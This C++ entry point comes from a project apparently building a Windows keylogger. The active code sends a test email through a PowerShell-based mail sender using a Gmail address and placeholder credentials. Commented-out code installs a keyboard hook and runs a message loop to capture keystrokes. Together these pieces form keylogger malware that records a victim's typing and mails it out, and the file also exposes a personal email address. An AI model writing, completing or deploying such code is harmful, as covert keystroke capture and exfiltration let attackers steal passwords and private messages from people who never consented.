#include <iostream>

#include "CurlMailSender.h"
#include "DefaultFileSystemAccess.h"
#include "PowerShellMailSender.h"

int main()
{
    keylogger::mail::PowerShellMailSender mailSender{
        std::make_unique<keylogger::mail::PowerShellSendMailScriptCreator>(
            std::make_shared<keylogger::DefaultFileSystemAccess>())};
    keylogger::mail::Mail mail{"michalovskyyy@gmail.com",
                               "michalovskyyy@gmail.com",
                               "elo",
                               "witam pana",
                               {}};
    keylogger::mail::Credentials credentials{"michalovskyyy@gmail.com", "xxx"};
    auto result = mailSender.sendMail(mail, credentials);
    if (result)
    {
        std::cerr << "mail sent";
        return 0;
    }
    return 1;
    // MSG message;

    // using namespace keylogger;
    // FileSystemHandler::createDirectory(FileSystemHandler::getCurrentPath(true));

    // KeyboardHook hook;

    // hook.installHook();

    // while (GetMessage(&message, nullptr, 0, 0))
    //{
    //	TranslateMessage(&message);
    //	DispatchMessage(&message);
    //}

    // hook.uninstallHook();
}